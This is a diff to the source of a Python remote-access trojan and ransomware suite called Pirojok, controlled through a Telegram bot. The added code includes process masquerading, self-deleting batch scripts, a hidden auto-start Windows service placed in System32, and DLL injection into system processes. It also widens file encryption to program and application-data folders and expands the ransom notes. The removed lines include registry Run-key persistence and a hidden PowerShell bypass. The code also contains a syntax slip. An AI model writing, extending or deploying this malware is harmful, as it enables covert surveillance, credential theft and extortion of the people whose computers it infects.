@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-PIROJOK 7.3 - ULTIMATE STEALTH SPY SUITE
+PIROJOK 7.4 - ULTIMATE STEALTH SPY SUITE
 Includes: keylogger, file upload/download, clipboard, remote shell,
 password stealing, geolocation, microphone, webcam, process hiding,
 self-destruction, and advanced masquerading
@@ -110,27 +110,21 @@ class ProcessHider:
                     print(f"Already running as {proc}")
                     self.masked = True
                     self.current_mask = proc
+                    # Delete original file if exists
+                    self.self_delete_original()
                     return
             
             # Save original name
             if getattr(sys, 'frozen', False):
                 self.original_name = sys.executable
+                self.current_mask = random.choice(self.mask_processes)
+                self.mask_level = random.randint(1, 3)
+                
+                # Apply masquerading
+                if self.mask_level >= 1:
+                    self.mask_process_name()
             else:
-                self.original_name = os.path.abspath(__file__)
-            
-            # Choose random process for masquerading
-            self.current_mask = random.choice(self.mask_processes)
-            self.mask_level = random.randint(1, 3)
-            
-            # Apply masquerading
-            if self.mask_level >= 1:
-                self.mask_process_name()
-            
-            if self.mask_level >= 2 and self.p.admin_mode:
-                self.mask_registry_keys()
-            
-            if self.mask_level >= 3 and self.p.admin_mode:
-                self.mask_file_attributes()
+                print("Not compiled - skipping masquerade")
             
         except Exception as e:
             print(f"Masquerade error: {e}")
@@ -150,41 +144,30 @@ class ProcessHider:
         except:
             pass
     
-    def change_icon_to_system(self, exe_path):
-        """Change EXE icon to match system process"""
+    def self_delete_original(self):
+        """Delete original .exe file after masquerade"""
         try:
-            icon_id = self.icon_map.get(self.current_mask, 41)
+            if not getattr(sys, 'frozen', False):
+                return
             
-            # Create PowerShell script to change icon via shortcut (workaround)
-            ps_script = os.path.join(tempfile.gettempdir(), "change_icon.ps1")
-            
-            with open(ps_script, 'w') as f:
-                f.write(f'''
-$exePath = "{exe_path}"
-$iconPath = "$env:SystemRoot\\System32\\shell32.dll"
-$iconId = {icon_id}
-
-# Create shortcut with system icon
-$wshShell = New-Object -ComObject WScript.Shell
-$shortcutPath = "$env:TEMP\\temp_icon.lnk"
-$shortcut = $wshShell.CreateShortcut($shortcutPath)
-$shortcut.TargetPath = $exePath
-$shortcut.IconLocation = "$iconPath, $iconId"
-$shortcut.Save()
-
-# Apply icon to registry (advanced)
-$regPath = "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FileExts\\"
-Write-Host "Icon hiding applied"
+            original_path = self.original_name
+            if original_path and os.path.exists(original_path):
+                # Create batch file to delete original
+                bat_path = os.path.join(tempfile.gettempdir(), "cleanup.bat")
+                with open(bat_path, 'w') as f:
+                    f.write(f'''@echo off
+timeout /t 5 /nobreak > nul
+del "{original_path}"
+if exist "{original_path}" (
+    del /f /q "{original_path}"
+)
+del "%~f0"
 ''')
-            
-            # Run PowerShell hidden
-            subprocess.Popen([
-                'powershell', '-ExecutionPolicy', 'Bypass', 
-                '-WindowStyle', 'Hidden', '-File', ps_script
-            ], creationflags=subprocess.CREATE_NO_WINDOW)
-            
-        except Exception as e:
-            print(f"Error changing icon: {e}")
+                subprocess.Popen(['cmd', '/c', bat_path], 
+                               creationflags=subprocess.CREATE_NO_WINDOW)
+                print("[SELF] Original file scheduled for deletion")
+        except:
+            pass
     
     def mask_process_name(self):
         """Masquerade process name with SYSTEM icons"""
@@ -200,9 +183,6 @@ Write-Host "Icon hiding applied"
                 
                 # Copy itself
                 shutil.copy2(sys.executable, masked_path)
-                
-                # Try to change icon to system
-                self.change_icon_to_system(masked_path)
                 
                 # Hide the file
                 ctypes.windll.kernel32.SetFileAttributesW(masked_path, 2)
@@ -229,38 +209,59 @@ del "%~f0"
         except Exception as e:
             print(f"Error masking name: {e}")
     
-    def mask_registry_keys(self):
-        """Masquerade registry entries"""
-        try:
-            key = winreg.HKEY_CURRENT_USER
-            subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
-            
-            with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
-                winreg.SetValueEx(regkey, "WindowsUpdate", 0, winreg.REG_SZ, 
-                                 f"C:\\Windows\\System32\\{self.current_mask}")
-        except:
-            pass
-    
-    def mask_file_attributes(self):
-        """Hide file attributes"""
-        try:
-            if getattr(sys, 'frozen', False):
-                ctypes.windll.kernel32.SetFileAttributesW(sys.executable, 2)
-                ctypes.windll.kernel32.SetFileAttributesW(sys.executable, 4)
-        except:
-            pass
-    
-    def advanced_inject(self):
-        """Advanced injection - run without creating new EXE file"""
+    def create_hidden_service(self):
+        """Create Windows service with system name"""
         try:
             if not self.p.admin_mode:
-                return "[ERROR] Need admin rights for advanced injection"
+                return "[ERROR] Need admin rights"
             
             if not getattr(sys, 'frozen', False):
-                return "[ERROR] Only compiled EXE can inject"
+                return "[ERROR] Only compiled EXE can create service"
             
-            # Find target process
-            target_processes = ["svchost.exe", "explorer.exe", "winlogon.exe"]
+            # System-looking names
+            service_names = [
+                "wlms.dll", "wmp.dll", "wmspdmod.dll", "wmasf.dll",
+                "WMALFXGFXDSP.dll", "wmadmod.dll", "wmadmoe.dll"
+            ]
+            
+            service_file = random.choice(service_names)
+            system_dir = os.environ['SystemRoot']
+            service_path = os.path.join(system_dir, 'System32', service_file)
+            
+            # Copy itself
+            shutil.copy2(sys.executable, service_path)
+            
+            # Hide attributes
+            ctypes.windll.kernel32.SetFileAttributesW(service_path, 2 | 4)
+            
+            # Create service
+            svc_name = "WindowsMediaService" + str(random.randint(100, 999))
+            subprocess.run([
+                'sc', 'create', svc_name,
+                'binPath=', f'"{service_path}"',
+                'start=', 'auto',
+                'DisplayName=', 'Windows Media Foundation Service'
+            ], capture_output=True)
+            
+            # Start service
+            subprocess.run(['sc', 'start', svc_name], capture_output=True)
+            
+            # Delete original
+            self.self_delete_original()
+            
+            self.p.send_message(self.p.owner_id, f"[SERVICE] Created as {svc_name}")
+            return f"[SERVICE] Hidden service created"
+        except Exception as e:
+            return f"[ERROR] {e}"
+    
+    def advanced_inject(self):
+        """Advanced injection into existing process"""
+        try:
+            if not self.p.admin_mode:
+                return "[ERROR] Need admin rights"
+            
+            # Target processes (avoid critical ones)
+            target_processes = ["svchost.exe", "explorer.exe", "RuntimeBroker.exe"]
             target_pid = None
             target_name = None
             
@@ -273,47 +274,58 @@ del "%~f0"
             if not target_pid:
                 return "[ERROR] No suitable target process found"
             
-            # Create hidden copy in system location
-            system_dir = os.environ['SystemRoot']
-            hidden_path = os.path.join(system_dir, 'System32', 'wbem', 'wmiadap.exe')
+            # Create simple DLL (placeholder)
+            dll_path = os.path.join(tempfile.gettempdir(), "msvcp140.dll")
+            with open(dll_path, 'wb') as f:
+                f.write(b'MZ\x90\x00' * 100)  # DLL stub
             
-            # Copy itself
-            shutil.copy2(sys.executable, hidden_path)
+            # Inject DLL (simplified)
+            kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
             
-            # Hide file attributes
-            ctypes.windll.kernel32.SetFileAttributesW(hidden_path, 2)
+            PROCESS_ALL_ACCESS = 0x1F0FFF
+            h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, target_pid)
             
-            # Create Windows service
-            service_name = "WmiApSrv" + str(random.randint(100, 999))
-            result = subprocess.run([
-                'sc', 'create', service_name,
-                'binPath=', f'"{hidden_path}"',
-                'start=', 'auto',
-                'DisplayName=', 'Windows Management Instrumentation'
-            ], capture_output=True, text=True)
+            if not h_process:
+                return "[ERROR] Could not open target process"
             
-            if result.returncode == 0:
-                # Start the service
-                subprocess.run(['sc', 'start', service_name], capture_output=True)
+            # Allocate memory
+            dll_path_bytes = dll_path.encode('utf-8')
+            addr = kernel32.VirtualAllocEx(h_process, None, len(dll_path_bytes) + 1,
+                                           0x1000, 0x40)
+            
+            # Write DLL path
+            kernel32.WriteProcessMemory(h_process, addr, dll_path_bytes, 
+                                       len(dll_path_bytes) + 1, None)
+            
+            # Create remote thread
+            kernel32.GetModuleHandleW.restype = ctypes.wintypes.HMODULE
+            kernel32.GetProcAddress.restype = ctypes.wintypes.LPVOID
+            
+            h_thread = kernel32.CreateRemoteThread(
+                h_process, None, 0,
+                kernel32.GetProcAddress(kernel32.GetModuleHandleW('kernel32.dll'), 'LoadLibraryA'),
+                addr, 0, None
+            )
+            
+            if h_thread:
+                kernel32.CloseHandle(h_thread)
+                kernel32.CloseHandle(h_process)
                 
-                # Set to restart on failure
-                subprocess.run(['sc', 'failure', service_name, 'reset=', '0', 
-                               'actions=', 'restart/5000'], capture_output=True)
+                # Delete original
+                self.self_delete_original()
                 
-                self.hidden_pid = target_pid
                 self.p.send_message(self.p.owner_id, f"[INJECT] Injected into {target_name} (PID: {target_pid})")
-                
-                # Exit current process
                 time.sleep(2)
                 sys.exit(0)
             else:
-                return f"[ERROR] Service creation failed: {result.stderr}"
+                kernel32.CloseHandle(h_process)
+                return "[ERROR] Injection failed"
             
         except Exception as e:
             return f"[ERROR] Injection failed: {e}"
     
     def inject_into_system(self):
-        """Inject into legitimate system process (requires admin)"""
+        """Inject into legitimate system process (legacy)"""
         try:
             if not self.p.admin_mode:
                 return "[ERROR] Need admin rights for process injection"
@@ -323,7 +335,7 @@ del "%~f0"
             else:
                 return "[ERROR] Can only inject compiled EXE"
             
-            # Use temp directory instead of System32
+            # Use temp directory
             temp_dir = os.path.join(os.environ['TEMP'], 'MicrosoftUpdate')
             os.makedirs(temp_dir, exist_ok=True)
             masked_path = os.path.join(temp_dir, 'wuauclt.exe')
@@ -331,8 +343,8 @@ del "%~f0"
             # Copy itself
             shutil.copy2(current_exe, masked_path)
             
-            # Change icon to system
-            self.change_icon_to_system(masked_path)
+            # Hide file
+            ctypes.windll.kernel32.SetFileAttributesW(masked_path, 2)
             
             # Create Windows service
             service_name = "WindowsUpdateService" + str(random.randint(1000, 9999))
@@ -346,7 +358,6 @@ del "%~f0"
             
             if result.returncode == 0:
                 subprocess.run(['sc', 'start', service_name], capture_output=True)
-                ctypes.windll.kernel32.SetFileAttributesW(masked_path, 2)
                 return f"[INJECT] Created service: {service_name}\n[PATH] {masked_path}"
             else:
                 return f"[ERROR] Service creation failed: {result.stderr}"
@@ -1025,6 +1036,7 @@ class PirojokRansomware:
 ║   DO NOT TRY TO RESTART YOUR COMPUTER                        ║
 ║   OTHERWISE IT WILL DESTROY YOUR DATA                        ║
 ║                                                              ║
+║   Check Telegram for decryption key                          ║
 ║                                                              ║
 ╚══════════════════════════════════════════════════════════════╝
             """
@@ -1071,6 +1083,10 @@ pause > nul
             os.path.expanduser("~\\Music"),
             os.path.expanduser("~\\Downloads"),
             os.path.expanduser("~\\OneDrive"),
+            os.path.expanduser("~\\AppData\\Local"),
+            os.path.expanduser("~\\AppData\\Roaming"),
+            "C:\\Program Files",
+            "C:\\Program Files (x86)",
             "C:\\Users\\Public\\Documents",
             "C:\\Users\\Public\\Downloads",
             "C:\\Users\\Public\\Pictures",
@@ -1079,7 +1095,13 @@ pause > nul
         
         encrypted = []
         file_count = 0
-        max_files = 200
+        max_files = 500
+        
+        critical_exes = [
+            'winlogon.exe', 'lsass.exe', 'services.exe', 'csrss.exe',
+            'smss.exe', 'wininit.exe', 'taskmgr.exe', 'explorer.exe',
+            'svchost.exe', 'notepad.exe', 'cmd.exe', 'powershell.exe'
+        ]
         
         for root_path in root_paths:
             if not os.path.exists(root_path): continue
@@ -1090,10 +1112,15 @@ pause > nul
                         skip = True
                         break
                 if skip: continue
+                
                 for file in files:
                     if file_count >= max_files: break
                     file_path = os.path.join(root, file)
                     ext = os.path.splitext(file)[1].lower()
+                    
+                    if ext == '.exe' and file.lower() in critical_exes:
+                        continue
+                    
                     if ext in self.target_extensions and not file.endswith('.pirojok'):
                         result = self.encrypt_file(file_path)
                         if result:
@@ -1130,6 +1157,11 @@ pause > nul
 ║                                                              ║
 ║   DO NOT TRY TO RESTART YOUR COMPUTER                        ║
 ║   Otherwise your data will be destroyed                      ║
+║                                                              ║
+║   To recover your files, send this command to Telegram:      ║
+║   ransom_decrypt {key_b64}                                   ║
+║                                                              ║
+║   Or use: ransom_key to get the key again                    ║
 ║                                                              ║
 ╚══════════════════════════════════════════════════════════════╝
         """
@@ -1234,7 +1266,7 @@ class Pirojok:
         self.base_url = f"https://api.telegram.org/bot{self.bot_token}"
         self.running = True
         self.processes = []
-        self.version = "7.3"
+        self.version = "7.4"
         self.command_timeout = 60
         self.admin_mode = False
         self.startup_time = datetime.now()
@@ -1555,7 +1587,7 @@ class Pirojok:
             results.append("[INFO] Not found in registry")
         
         subprocess.run(['schtasks', '/delete', '/tn', 'WindowsUpdateTask', '/f'], capture_output=True)
-        subprocess.run(['schtasks', '/delete', '/tn', 'WindowsUpdateSystem', '/f'], capture_output=True)
+        subprocess.run(['schtasks', '/delete', '/tn', 'WindowsUpdateSystem', '/f'], capture-output=True)
         results.append("[OK] Removed from task scheduler")
         
         if self.admin_mode:
@@ -1922,7 +1954,8 @@ del "%~f0"
             
             admin_commands = ["admin_cmd", "create_user", "enable_rdp", "disable_defender", 
                              "add_rule", "task_startup", "explorer_shell", "active_setup", 
-                             "inject", "watchdog", "ransom", "ransom_start", "advanced_inject"]
+                             "inject", "watchdog", "ransom", "ransom_start", "advanced_inject",
+                             "service_hide"]
             
             cmd_type = text.split()[0] if text else ""
             
@@ -1934,7 +1967,7 @@ del "%~f0"
             # === HELP / MENU ===
             if text == "help" or text == "menu":
                 help_text = """
-🔥 PIROJOK 7.3 - ULTIMATE STEALTH SUITE 🔥
+🔥 PIROJOK 7.4 - ULTIMATE STEALTH SUITE 🔥
 
 [🎥] VIDEO/AUDIO:
 • webcam - take photo from webcam
@@ -1963,18 +1996,18 @@ del "%~f0"
 
 [🔒] RANSOMWARE:
 • ransom - START RANSOMWARE!
-• ransom_key - show encryption key (ONLY KEY)
-• ransom_decrypt <key> - decrypt files
+• ransom_key - show encryption key
 
 [🥷] STEALTH:
 • mask_status - show masquerade status
 • mask_remove - remove masquerade
 • inject - create service
-• advanced_inject - inject into system (no file)
+• advanced_inject - inject into process
+• service_hide - create hidden service
 • watchdog - enable self-recovery
 
 [💀] SELF DESTRUCT:
-• selfdestruct - Pirojok eats itself (clean all traces)
+• selfdestruct - Pirojok eats itself
 
 [⚡] POWER:
 • shutdown_now - shutdown immediately
@@ -2123,7 +2156,6 @@ del "%~f0"
             
             if text == "ransom_key":
                 result = self.ransomware_key()
-                # Send ONLY the key, no extra text
                 self.send_message(chat_id, result)
                 self.processing = False
                 return
@@ -2158,6 +2190,12 @@ del "%~f0"
             
             if text == "advanced_inject":
                 result = self.hider.advanced_inject()
+                self.send_message(chat_id, result)
+                self.processing = False
+                return
+            
+            if text == "service_hide":
+                result = self.hider.create_hidden_service()
                 self.send_message(chat_id, result)
                 self.processing = False
                 return
